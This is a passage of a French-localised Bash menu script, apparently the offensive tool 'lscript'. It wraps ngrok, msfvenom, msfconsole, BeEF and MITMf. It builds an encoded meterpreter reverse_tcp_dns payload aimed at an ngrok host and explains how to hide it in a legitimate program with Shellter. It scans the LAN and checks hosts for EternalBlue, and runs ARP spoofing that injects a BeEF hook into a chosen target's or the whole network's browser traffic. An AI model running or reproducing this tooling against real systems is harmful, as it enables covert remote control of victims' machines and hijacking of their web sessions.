		elif [[ "$CI" = "b" ]]
		then
			clear
			break
		fi
	done
}
function donate_option
{
	while true
	do
	clear
	TERMINALTITLE="DON"
	dash_calc
	printf '\033]2;DON\a'
	echo -e "Si vous avez trouvé mon script utile, vous pouvez m'acheter un café :)"
	echo -e ""$LBS"Total des dons pour lscript:"$CE" $DONATIONS"
	echo -e ""$YS" 1"$CE") Ouvrir le navigateur pour faire un don"
	echo -e ""$YS" 2"$CE") Copier le lien de don"
	echo -e ""$YS" b"$CE") Je me fiche de ton travail! :P"
	echo -e "Choix: "
	read DON
	if [[ "$DON" = "1" ]]
	then
		gio open "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
	elif [[ "$DON" = "2" ]]
	then
		echo -e "Lien de don: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$DON" = "back" || "$DON" = "b" || "$DON" = "00" ]]
	then
		BACKL=1
		break
	elif [[ "$DON" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function ngrok_option
{
	while true
	do
		clear
		if [[ -f /root/ngrok ]]
		then
			TERMINALTITLE="NGROK"
			dash_calc
			printf '\033]2;NGROK\a'
			echo -e ""$YS"help"$CE") Comment le faire fonctionner?"
			echo -e ""$YS" 1"$CE") Ouvrir un port TCP"
			echo -e ""$YS" 2"$CE") Ouvrir un port TLS"
			echo -e ""$YS" 3"$CE") Ouvrir un port HTTP"
			echo -e ""$YS" 4"$CE") Intégration avec Shellter"
			echo -e ""$YS" 5"$CE") Configurez votre AuthToken ngrok"
			echo -e ""$YS" b"$CE") Retour"
			echo -e "Choix: "
			read NG
			clear
			if [[ "$NG" = "help" || "$NG" = "h" ]]
			then
				echo -e "Avec ngrok, vous pouvez rediriger sans intégration de routeur."
				echo -e "C'est gratuit, CEPENDANT:"
				echo -e "---pour ouvrir un port tcp, vous devez vous inscrire (c'est trop facile)"
				echo -e "   Aller sur https://ngrok.com et choisissez "$YS"sign up/s'inscrire"$CE"."
				echo -e "   Une fois cela fait, copiez le "$YS"authtoken"$CE" donné."
				echo -e "   (Si vous ne le trouvez pas, allez à: https://dashboard.ngrok.com/auth )"
				echo -e "   Sélectionnez ensuite l'option 'set your authtoken' dans lscript, et collez-la."
				echo -e "---pour faire un Payload tcp inversé:"
				echo -e "   Vous devez définir le payload dans: windows/meterpreter/reverse_tcp_dns"
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$NG" = 1 || "$NG" = 2 || "$NG" = 3 ]]
			then
				echo -e "Tapez le port local à transférer: "
				read PORTL
				if [[ "$NG" = 1 ]]
				then
					PROT="tcp"
				elif [[ "$NG" = 2 ]]
				then
					PROT="tls"
				else
					PROT="http"
				fi
				export PORTL
				export PROT
				xterm -geometry 85x15+9999+999999 -e bash -c './ngrok $PROT $PORTL; exec bash' & disown
			elif [[ "$NG" = 4 ]]
			then
				while true
				do
					clear
					echo -e ""$YS" 1"$CE") Créer Payload tcp brut pour Shellter"
					echo -e ""$YS" 2"$CE") Comment l'intégrer"
					echo -e ""$YS" b"$CE") Retour"
					echo -e "Choix:"
					read SHINT
					clear
					if [[ "$SHINT" = 1 ]]
					then
						while true
						do
							if [[ "$NGPORT" = "" ]]
							then
								NGPORT="\e[1;31mNONE\e[0m"
							fi
							clear
							echo -e ""$YS" 1"$CE") Définir le port TCP Ngrok              ACTUEL:"$NGPORT""
							#~ echo -e ""$YS" 2"$CE") Définir le port TCP Ngrok             ACTUEL:"$LPORT""
							echo -e ""$YS" b"$CE") Retour"
							echo -e ""$YS"run"$CE") Créer le Payload"
							echo -e "Choix: "
							read RP
							if [[ "$RP" = 1 ]]
							then
								echo -e "Ngrok port: "
								read NGPORT
							elif [[ "$RP" = "back" || "$RP" = "b" ]]
							then
								break
							elif [[ "$RP" = "run" ]]
							then
								RAW=rawfud
								NUMB=1
								while true
								do
									RAWN=""$RAW""$NUMB""
									if [[ -f /root/Desktop/"$RAWN".raw ]]
									then
										NUMB=$((NUMB+1))
									else
										break
									fi
								done
								msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=0.tcp.ngrok.io LPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/"$RAWN".raw
								sleep 2
								if [[ -f /root/Desktop/"$RAWN".raw ]]
								then
									clear
									echo -e "Payload sauvegardé ici: /root/Desktop/"$RAWN".raw"
								fi
								echo -e "$PAKTGB"
								$READAK
							fi
						done
					elif [[ "$SHINT" = 2 ]]
					then
						echo -e "Vous devez d'abord créer un Payload brut avec l'option 1."
						echo -e "Ouvrez ensuite shellter et sélectionnez votre application à injecter."
						echo -e "Ensuite, en mode furtif, sélectionnez y."
						echo -e "Sélectionnez pour saisir un Payload personnalisé, NON répertorié."
						echo -e "Tapez ensuite le chemin du Payload que vous avez créée sur l'option 1."
						echo -e "Pour l'écouteur, le payload est windows/meterpreter/reverse_tcp_dns"
						echo -e "LHOST esr 127.0.0.1 et LPORT est le port que vous avez ouvert à ngrok."
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$SHINT" = "back" || "$SHINT" = "b" ]]
					then
						break
					fi
				done
			elif [[ "$NG" = "back" || "$NG" = "b" || "$NG" = "00" ]]
			then
				clear
				break
			elif [[ "$NG" = 0 ]]
			then
				clear
				exit
			elif [[ "$NG" = 5 ]]
			then
					echo -e "Entrez votre authtoken: "
					read AUTHT
					if [[ "$AUTHT" != "" ]]
					then
						./ngrok authtoken $AUTHT
						echo -e "$PAKTGB"
						$READAK
					fi
			fi
		else
			echo -e ""$RS"Ngrok N'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ngrok
			fi
		fi
	done
}
function geolocate_ip()
{
	locbool=1
	echo -e ""$BS"MErci de patienter..."$CE""
	A1="$1"
	AA1=$(is_it_an_ip "$A1")
	if [[ "$AA1" = 1 ]]
	then
		country=$(curl ipinfo.io/"$A1"/country 2>/dev/null)
		if [[ "$country" = "" ]]
		then
			country=""$RS"Pas trouvé"$CE""
		fi
		loc=$(curl ipinfo.io/"$A1"/loc 2>/dev/null)
		if [[ "$loc" = "" ]]
		then
			locbool=0
			loc=""$RS"Pas trouvé"$CE""
		fi
		city=$(curl ipinfo.io/"$A1"/city 2>/dev/null)
		if [[ "$city" = "" ]]
		then
			city=""$RS"Pas trouvé"$CE""
		fi
		org=$(curl ipinfo.io/"$A1"/org 2>/dev/null)
		if [[ "$org" = "" ]]
		then
			org=""$RS"Pas trouvé"$CE""
		fi
		postal=$(curl ipinfo.io/"$A1"/postal 2>/dev/null)
		if [[ "$postal" = "" ]]
		then
			postal=""$RS"Pas trouvé"$CE""
		fi
		region=$(curl ipinfo.io/"$A1"/region 2>/dev/null)
		if [[ "$region" = "" ]]
		then
			region=""$RS"Pas trouvé"$CE""
		fi
		hostname=$(curl ipinfo.io/"$A1"/hostname 2>/dev/null)
		if [[ "$hostname" = "" ]]
		then
			hostname=""$RS"Pas trouvé"$CE""
		fi
		echo -e "        Pays: $country"
		echo -e "      Region: $region"
		echo -e "Localisation: $loc"
		echo -e "       Ville: $city"
		echo -e " Code Postal: $postal"
		echo -e "    Hostname: $hostname"
		echo -e "Organisation: $org"
		if [[ "$locbool" = 0 ]]
		then
			echo -e ""$RS" m"$CE") Ouvrir la localisation Google Maps"
		else
			echo -e ""$YS" m"$CE") Ouvrir la localisation Google Maps"
		fi
		echo -e ""$YS" *"$CE") Retour"
		echo -e "Choix: "
		read ge
		if [[ "$ge" = "m" ]]
		then
			if [[ "$locbool" = 0 ]]
			then
				echo -e ""$RS"Localisation non trouvée"$CE""
				sleep 3
			else
				gio open https://www.google.gr/maps/search/"$loc"/
			fi
		else
			clear
			BACKL=1
		fi
	else
		echo 0
	fi
}
function ip_scan()
{
	
while true
do
	#interface de passage
	IPF=$1
	#mode de passage, le cas échéant  (1=au choix   2=seulement rescanable)
	#Le mode 1 est pour choisir et renvoyer l'IP.
	#Le mode 2 sert à faire écho au scan, pas à choisir.
	MODE=$2
	export IPF
	if [[ "$IPF" = "" ]]
	then
		echo -e ""$RS"Erreur 6. Aucun paramètre transmis"$CE""
		sleep 3
		break
	fi
	#getting local ip
	LLL=$(local_ips $IPF)
	#getting zero ip
	ZERO=$(give_ip_take_zero $LLL)
	export ZERO
	echo -e ""$BS"Scan, veuillez patienter..."$CE""
	tempfile="/root/lscript/tempscan.txt"
	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile"
	#gnome-terminal -- arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile
	clear
	######
	T1=$(cat $tempfile | grep "Ending arp-scan")
	if [[ "$T1" = "" ]]
	then
		lines=$(cat $tempfile | awk 'END{print NR}')
		hosts=$((lines-3))
	else
		lines=$(cat $tempfile | awk 'END{print NR}')
		hosts=$((lines-5))
	fi
	hostsbackup="$hosts"
		if [[ "$hosts" -le 0 ]]
		then
			echo -e ""$RS"Aucun hôte trouvé"$CE""
			sleep 1
		else
			echo -e ""$BS"Hôte(s) trouvé(s):"$CE""
			##########
			n=1
			n2=2
			while [[ "$n" -le "$hosts" ]]
			do
				#Les hôtes commencent à la ligne 3
				n1=$((n2+n))
				host[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1 && $0 !~ /DUP:/){print $1}}')
				if [[ "${host[$n]}" = "" ]]
				then
					#il y a parfois des adresses IP en double, ce qui devrait les supprimer.
					n2=$((n2+1))
					hosts=$((hosts-1))
					#~ n=$((n+1))
					continue
				fi
				size=${#host[$n]}
				sized=$((20-size))
				SPACESN=" "
				numcalc=1
				while [ $numcalc != $sized ]
				do
					SPACESN=""${SPACESN}" "
					numcalc=$(( numcalc+1 ))
				done
				mi[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $2}}')
				im[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $3}}')
				if [[ "$MODE" = 1 ]]
				then
					echo -e ""$YS" $n"$CE") "${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
				else
					echo -e ""${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
				fi
				n=$((n+1))
			done
			if [[ "$MODE" = 1 ]]
			then
				echo -e ""$YS" r"$CE") Rescanner"
				echo -e ""$YS" b"$CE") Retour"
				echo -e "Choix: "
				read sch
				if [[ "$sch" = "b" ]]
				then
					echo ""
				elif [[ "$sch" = "r" ]]
				then
					clear
					continue
				elif [[ "$sch" -le "$hosts" && "$sch" -ge 1 ]]
				then
					OUTPUT="${host[$sch]}"
					export OUTPUT
					#~ echo "$OUTPUT"
				fi
			else
				echo -e ""$YS" e"$CE") Vérifier Eternalblue Exploit sur les IP"
				echo -e ""$YS" r"$CE") Rescanner"
				echo -e "Appuyez sur "$YS"une touche différente"$CE" pour revenir en arrière"
				read -n 1 ko
				if [[ "$ko" = "r" ]]
				then
					clear
					continue
				elif [[ "$ko" = "e" ]]
				then
					n=1
					totalhosts=""
					while [[ "$n" -le "$hostsbackup" ]]
					do
						totalhosts=""$totalhosts" "${host["$n"]}""
						n=$((n+1))
					done
					clear
					if [[ "$totalhosts" = "" || "$totalhosts" = " " ]]
					then
						echo -e ""$RS"Aucun hôte trouvé pour vérifier"$CE""
						sleep 2
						continue
					fi
					echo -e ""$BS"RHOSTS"$CE" <- "$totalhosts""
					sleep 2
					if [[ ! -d "$LPATH"/rce ]]
					then
						mkdir	"$LPATH"/rce
					fi
					echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
					echo "set RHOSTS "$totalhosts"" >> "$LPATH"/rce/eternalbluerc.rc
					echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
					echo -e ""$BS"Lancement de msfconsole. Merci de patienter..."$CE""
					msfconsole -r "$LPATH"/rce/eternalbluerc.rc
				else
					BACKL=1
					break
				fi
			fi
			##########
		fi
		break
	#~ fi
	######
done

}
function browser_exploiting
{
	if [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]
	then
		echo -e ""$BS"Installation de arp-scan"$CE""
		install_arp_scan
		clear
	fi
	TAR=""
	SINT=""
	beefrunning=0
	clear
	while true
	do
		clear
		TERMINALTITLE="Auto-exploit browser"
		dash_calc
		printf '\033]2;AUTO-EXPLOIT BROWSER\a'
		if [[ "$SINT" = "" ]]
		then
			WL=$(ifconfig | grep "$WLANN:")
			if [[ "$WL" != "" ]]
			then
				SINT="$WLANN"
				inter=0
			else
				EL=$(ifconfig | grep "$ETH:")
				if [[ "$EL" != "" ]]
				then
					SINT="$ETH"
					inter=0
				else
					SINT=""$RS"Not found"$CE""
					inter=1
				fi
			fi
			
		fi
		if [[ "$TAR" = "" ]]
		then
			TAR=""$RS"Not set"$CE""
			tarer=1
		fi
		echo -e ""$YS" 1"$CE") Sélectionner une interface      ACTUELLE:"$YS""$SINT""$CE""
		echo -e ""$YS" 2"$CE") Sélectionner une cible          ACTUELLE:"$YS""$TAR""$CE""
		echo -e ""$YS" 3"$CE") Start BeEF"
		echo -e ""$YS" 4"$CE") Ouvrir panneau ui de BeEF dans le navigateur"
		echo -e ""$YS" 5"$CE") Start MITMf"
		echo -e ""$YS" 6"$CE") Corriger les erreurs"
		#~ echo -e ""$YS" 4"$CE") Fermez toutes les fenêtres"
		echo -e ""$YS" i"$CE") Info"
		echo -e ""$YS" b"$CE") Retour"
		echo -e "Choix: "
		read AEB
		clear
		if [[ "$AEB" = "b" || "$AEB" = 00 ]]
		then
			clear
			BACKL=1
			break
		elif [[ "$AEB" = "i" ]]
		then
			clear
			echo -e ""$LGYS"Sur ce menu, vous pouvez exploiter et contrôler les navigateurs de votre réseau."
			echo -e "Instructions: "
			echo -e "BeEF:"
			echo -e "	Vous devez d'abord spécifier une interface. Puis démarrez BeEF."
			echo -e "	Puis, ouvrez le panneau d'interface utilisateur et connectez-vous avec beef:beef ."
			echo -e "	Là, vous verrez si des navigateurs sont en ligne."
			echo -e "MITMf:"
			echo -e "	Vous devez d'abord spécifier une interface et une cible. Puis démarrez MITMf."
			echo -e "	MITMf essaie d'injecter le hook.js javascript au site Web de la cible."$CE""
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$AEB" = 6 ]]
		then
			while true
			do
			clear
			TERMINALTITLE="Corriger les erreurs"
			dash_calc
			printf '\033]2;Corriger les erreurs\a'
			echo -e ""$YS" 1"$CE") MITMf erreur: Un autre processus en cours d'exécution sur le port 53"
			echo -e ""$YS" 2"$CE") BeEF  erreur: Un autre processus d'écoute sur le port 3000"
			echo -e ""$YS" 3"$CE") MITMf erreur: Impossible de résoudre le MAC de la passerelle"
			echo -e ""$YS" 4"$CE") MITMf erreur: [Erreuro 98] Adresse déjà utilisée"
			echo -e ""$YS" b"$CE") Retour"
			echo -e "Choix: "
			read AE
			clear
			if [[ "$AE" = 1 ]]
			then
				#~ echo -e "Pour cette erreur, vous devez taper "$YS"netstat -lnpu | grep :53"$CE" pour trouver le processus qui s'exécute
				#~ sur le port 53 et le avec "$YS"kill <PID>"$CE""
				PID1=$(lsof -t -i:53)
				if [[ "$PID1" = "" ]]
				then
					echo -e ""$RS"Impossible de trouver le processus en cours d'exécution sur le port 53"$CE""
				else
					kill $PID1 && echo -e ""$YS"Corrigé."$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 2 ]]
			then
				echo -e "Vous êtes confronté à cette erreur car vous n'avez pas appuyé sur "$YS"ctrl c"$CE" sur la fenêtre de BeEF
				pour la fermer."
				echo -e ""
				PID1=$(lsof -t -i:3000)
				if [[ "$PID1" = "" ]]
				then
					echo -e ""$RS"Impossible de trouver le processus en cours d'exécution sur le port 3000"$CE""
				else
					kill $PID1 && echo -e ""$YS"Corrigé."$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 3 ]]
			then
				echo -e "La seule solution est de réessayer l'option mitmf jusqu'à ce qu'elle démarre correctement."
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 4 ]]
			then
				HT=$(lsof -t -i:80)
				if [[ "$HT" = "" ]]
				then
					echo -e ""$RS"Impossible de trouver le problème"$CE""
				else
					kill $HT && echo -e ""$YS"Corrigé"$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = "b" ]]
			then
				clear
				break
			fi
			done
		elif [[ "$AEB" = 4 ]]
		then
			#assurez-vous que BeEF est en cours d'exécution.
			if [[ "$beefrunning" = 0 ]]
			then
				echo -e ""$RS"BeEF n'est pas en cours d'exécution"$CE""
				sleep 3
			else
				clear
				export SINT
				LOC=$(local_ips $SINT)
				export LOC
				CONF=$(is_it_an_ip $LOC)
				if [[ "$CONF" = 1 ]]
				then
					gio open http://"$LOC":3000/ui/panel
				else
					echo -e ""$RS"Impossible de trouver votre adresse IP locale"$CE""
					sleep 3
				fi
			fi
		elif [[ "$AEB" = 2 ]]
		then
			if [[ "$inter" != 1 ]]
			then
				clear
				while true
				do
					clear
					TERMINALTITLE="Choisir la cible"
					dash_calc
					printf '\033]2;CHOISIR LA CIBLE\a'
					echo -e ""$YS" 1"$CE") Scanner et choisir"
					echo -e ""$YS" 2"$CE") Tapez l'IP de la cible"
						echo -e ""$YS" 3"$CE") Cibler l'ensemble du réseau"
					echo -e ""$YS" b"$CE") Retour"
					echo -e "Choix: "
					read TARR
					clear
					if [[ "$TARR" = "b" ]]
					then
						break
					elif [[ "$TARR" = 1 ]]
					then
						ip_scan $SINT 1
						TARGETI="$OUTPUT"
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							tarer=1
						fi
						wholenetwork=0
						break
					elif [[ "$TARR" = 2 ]]
					then
						echo -e "Target: "
						read TARGETI
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							echo -e ""$RS"Invalid IP"$CE""
							tarer=1
							sleep 2
						fi
						wholenetwork=0
						break
					elif [[ "$TARR" = 3 ]]
					then	
						TAR="EVERYONE"
						tarer=0
						wholenetwork=1
						break
					fi
				done
			else
				echo -e ""$RS"Sélectionnez d'abord l'interface"$CE""
				sleep 2
			fi
		elif [[ "$AEB" = 5 ]]
		then
			if [[ "$inter" = 0 && "$tarer" = 0 ]]
			then
				if [[ -d /root/MITMf ]]
				then
						mitmfint="$SINT"
						export mitmfint
						clear
						mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
						isit=$(is_it_an_ip "$mitmfgate")
						if [[ "$mitmfgate" != "" && "$isit" = 1 ]]
						then
							export mitmfgate
							clear
							TEST=$(ifconfig | grep $mitmfint)
							if [[ $TEST != "" ]]
							then
								iffile=""$LPATH"/iftemp.txt"
								ifconfig $mitmfint > $iffile
								mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
							else
								echo -e ""$RS"ERREUR 5. Impossible de trouver votre adresse IP locale. Assurez-vous que vous êtes connecté à un réseau sur l'interface "$SINT""$CE""
								echo -e "$PAKTGB"
								$READAK
								continue
							fi
							clear
							echo -e "Chemin de l'URL de hook.js("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
							read hookch
							if [[ "$hookch" = "" ]]
							then
								mitmfhook="http://"$mitmflocalip":3000/hook.js"
							else
								mitmfhook="$hookch"
							fi
							export mitmfhook
							cd /root/MITMf
							clear
							if [[ "$wholenetwork" == 0 ]]
							then
								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
							else
								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
							fi
							cd
						else
							echo -e ""$RS"ERREUR 4. Impossible de trouver la passerelle. Assurez-vous que vous êtes connecté à un réseau sur l'interface "$SINT""$CE""
							echo -e "$PAKTGB"
							$READAK
						fi
				else
					echo -e ""$RS"Mitmf n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
					read INSTALL
					if [[ "$INSTALL" = "install" ]]
					then
						install_mitmf
					fi
				fi
				cd
			else
				if [[ "$inter" = 1 ]]
				then
					echo -e ""$RS"Aucune interface sélectionnée"$CE""
				fi
				if [[ "$tarer" = 1 ]]
				then
					echo -e ""$RS"Aucune cible sélectionnée"$CE""
					sleep 1
				fi
				sleep 2
			fi
		elif [[ "$AEB" = 3 ]]
		then
			if [[ "$inter" = 1 ]]
			then
				echo -e ""$RS"Aucune interface sélectionnée"$CE""
				sleep 2
				continue
			fi
			cd /usr/share/beef-xss 
			beefrunning=1
			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
			cd
		elif [[ "$AEB" = 0 ]]
		then
			clear
			exit
		elif [[ "$AEB" = 1 ]]
		then
			select_interface
			
		#if inter=1 then error
		fi
	done
}
function settings_menu
{
	if [[ ! -d "$LPATH"/settings ]]
	then
		mkdir "$LPATH"/settings 
	fi
	clear
	while true
	do
		clear
		TERMINALTITLE="SETTINGS"
		dash_calc
		printf '\033]2;SETTINGS\a'
		if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
		then
			read ALFA < "$LPATH"/settings/AWUS036ACH.txt
		else
			ALFA="no"
		fi
		if [[ -f "$LPATH"/settings/startmac.txt ]]
		then
			read STARTMAC < "$LPATH"/settings/startmac.txt
		else
			STARTMAC="00:11:22:33:44:55"
		fi
		if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
		then
			read IGN < "$LPATH"/settings/ignorenegativeone.txt
		else
			IGN="no"
		fi
		if [[ -f "$LPATH"/settings/arpin.txt ]]
		then
			read ARPIN < "$LPATH"/settings/arpin.txt
		else
			ARPIN="$WLANN"
		fi
		echo -e ""$YS" 1"$CE") Changer la couleur du logo"
		echo -e ""$YS" 2"$CE") Paramètres de Howdoi"
		echo -e ""$YS" 3"$CE") Prise en charge d'ALFA AWUS036ACH             $ALFA"
		echo -e ""$YS" 4"$CE") Ignorer le négatif lors de la mise à la terre $IGN"
		echo -e ""$YS" 5"$CE") MAC à configurer au démarrage du moniteur     $STARTMAC"	
		echo -e ""$YS" 6"$CE") Interface pour arp-scan                       $ARPIN"
		echo -e ""$YS" 7"$CE") Interface pour iftop (voir la bande passante) $iftopint"
		echo -e ""$YS" b"$CE") Retour"
		echo -e ""$YS" 0"$CE") Quitter"
		echo -e "Choix: "
		read SET
		clear
		if [[ "$SET" = "back" || "$SET" = "b" || "$SET" = "00" ]]
		then
			BACKL=1
			break
		elif [[ "$SET" = 0 ]]
		then
			exit
		elif [[ "$SET" = 7 ]]
		then
			clear
			echo -e ""$BS"Interface à utiliser pour iftop: "$CE""
			read IFTOP
			IFTOPTEST=$(ifconfig | grep "$IFTOP")
			if [[ "$IFTOPTEST" = "" ]]
			then
				echo -e ""$RS""$IFTOP" n'est pas disponible actuellement."$CE""
				echo -e "Voulez-vous toujours utiliser $IFTOP pour iftop?"$YNYES""
				read STARP
				if [[ "$STARP" = "n" ]]
				then
					IFTOP=""
					continue
				fi
			fi
			echo -e "$IFTOP" > "$LPATH"/settings/iftopint.txt
		elif [[ "$SET" = 6 ]]
		then
			clear
			echo -e ""$BS"Interface à utiliser pour arp-scan: "$CE""
			read ARPIN
			ARPINTEST=$(ifconfig | grep "$ARPIN")
			if [[ "$ARPINTEST" = "" ]]
			then
				echo -e ""$RS""$ARPIN" n'est pas disponible actuellement."$CE""
				echo -e "Voulez-vous toujours utiliser $ARPIN pour arp-scan?"$YNYES""
				read STARP
				if [[ "$STARP" = "n" ]]
				then
					ARPIN=""
					continue
				fi
			fi
			echo -e "$ARPIN" > "$LPATH"/settings/arpin.txt
		elif [[ "$SET" = 5 ]]
		then
			clear
			echo -e "Saisissez un nouveau MAC("$YS"Entrer"$CE"="$DEFMAC"): "
			read NEWMAC
			if [[ "$NEWMAC" = "" ]]
			then
				echo "$DEFMAC" > "$LPATH"/settings/startmac.txt
			else
				sizemac=${#NEWMAC}
				if [[ "$sizemac" != 17 ]]
				then
					echo -e ""$RS"MAC non valide. Rétablissement de la valeur par défaut"$CE""
					sleep 4
				else
					echo $NEWMAC > "$LPATH"/settings/startmac.txt
				fi
			fi
		elif [[ "$SET" = 4 ]]
		then
			if [[ "$IGN" = "yes" ]]
			then
				IGN="no"
			else
				IGN="yes"
			fi
			echo -e "$IGN" > "$LPATH"/settings/ignorenegativeone.txt
		elif [[ "$SET" = 3 ]]
		then
			if [[ "$ALFA" = "yes" ]]
			then
				ALFA="no"
			else
				ALFA="yes"
			fi
			echo -e "$ALFA" > "$LPATH"/settings/AWUS036ACH.txt
		elif [[ "$SET" = 2 ]]
		then
			while true
			do
				clear
				if [[ -f "$LPATH"/settings/dispfull.txt ]]
				then
					read dispfull < "$LPATH"/settings/dispfull.txt
				else
					dispfull="false"
				fi
				if [[ -f "$LPATH"/settings/colorout.txt ]]
				then
					read colorout < "$LPATH"/settings/colorout.txt
				else
					colorout="false"
				fi
				if [[ -f "$LPATH"/settings/onlylink.txt ]]
				then
					read onlylink < "$LPATH"/settings/onlylink.txt
				else
					onlylink="false"
				fi
				if [[ -f "$LPATH"/settings/numofans.txt ]]
				then
					read numofans < "$LPATH"/settings/numofans.txt
				else
					numofans="1"
				fi
				echo -e ""$YS" 1"$CE") Afficher le texte complet de la réponse   "$dispfull""
				echo -e ""$YS" 2"$CE") Sortie colorisée                          "$colorout""
				echo -e ""$YS" 3"$CE") Afficher uniquement le lien de réponse    "$onlylink""
				echo -e ""$YS" 4"$CE") Nombre de réponses à renvoyer             "$numofans""
				echo -e ""$YS" 5"$CE") Vider le cache"
				echo -e ""$YS" b"$CE") Retour"
				echo -e "Choix: "
				read HOWCH
				if [[ "$HOWCH" = 1 ]]
				then
					if [[ "$dispfull" = "false" ]]
					then
						dispfull="true"
					else
						dispfull="false"
					fi
					echo "$dispfull" > "$LPATH"/settings/dispfull.txt
				elif [[ "$HOWCH" = 2 ]]
				then
					if [[ "$colorout" = "false" ]]
					then
						colorout="true"
					else
						colorout="false"
					fi
					echo "$colorout" > "$LPATH"/settings/colorout.txt
				elif [[ "$HOWCH" = 3 ]]
				then
					if [[ "$onlylink" = "false" ]]
					then
						onlylink="true"
					else
						onlylink="false"
					fi
					echo "$onlylink" > "$LPATH"/settings/onlylink.txt
				elif [[ "$HOWCH" = 4 ]]
				then
					echo -e "Entrez le nombre de réponses à retourner: "
					read numofans
					echo "$numofans" > "$LPATH"/settings/numofans.txt
				elif [[ "$HOWCH" = 5 ]]
				then
					howdoi -C
				elif [[ "$HOWCH" = "b" || "$HOWCH" = "back" ]]
				then
					break
				elif [[ "$HOWCH" = 00 ]]
				then
					exec bash $0
				elif [[ "$HOWCH" = 0 ]]
				then
					exit
				fi
			done
		elif [[ "$SET" = 1 ]]
		then
			TERMINALTITLE="COULEURS DU LOGO"
			dash_calc
			echo -e ""$YS" 1"$CE") Rouge clair (defaut)    "$RS"TEST"$CE""
			echo -e ""$YS" 2"$CE") Rouge                   "$DRS"TEST"$CE""
			echo -e ""$YS" 3"$CE") Violet clair            "$LPS"TEST"$CE""
			echo -e ""$YS" 4"$CE") Violet                  "$PS"TEST"$CE""
			echo -e ""$YS" 5"$CE") Vert clair              "$LGNS"TEST"$CE""
			echo -e ""$YS" 6"$CE") Vert                    "$GNS"TEST"$CE""
			echo -e ""$YS" 7"$CE") Cyan clair              "$LCYS"TEST"$CE""
			echo -e ""$YS" 8"$CE") Cyan                    "$CYS"TEST"$CE""
			echo -e ""$YS" 9"$CE") Bleu clair              "$LBS"TEST"$CE""
			echo -e ""$YS"10"$CE") Bleu                    "$BS"TEST"$CE""
			echo -e ""$YS"11"$CE") Gris clair              "$LGYS"TEST"$CE""
			echo -e ""$YS"12"$CE") Gris foncé              "$DGYS"TEST"$CE""
			echo -e ""$YS"13"$CE") Jaune                   "$YS"TEST"$CE""
			echo -e ""$YS"14"$CE") Marron                  "$BRS"TEST"$CE""
			echo -e ""$YS"15"$CE") Blanc                   "$WHS"TEST"$CE""
			echo -e ""$YS"16"$CE") Noir                    "$BLS"TEST"$CE""
			echo -e ""$YS" b"$CE") Retour"
			echo -e "Choix: "
			read LC
			if [[ "$LC" = 1 ]]
			then
				echo -e "\e[1;31m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 2 ]]
			then
				echo -e "\e[0;31m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 3 ]]
			then
				echo -e "\e[1;35m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 4 ]]
			then
				echo -e "\e[0;35m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 5 ]]
			then
				echo -e "\e[1;32m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 6 ]]
			then
				echo -e "\e[0;32m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 7 ]]
			then
				echo -e "\e[1;36m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 8 ]]
			then
				echo -e "\e[0;36m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 9 ]]
			then
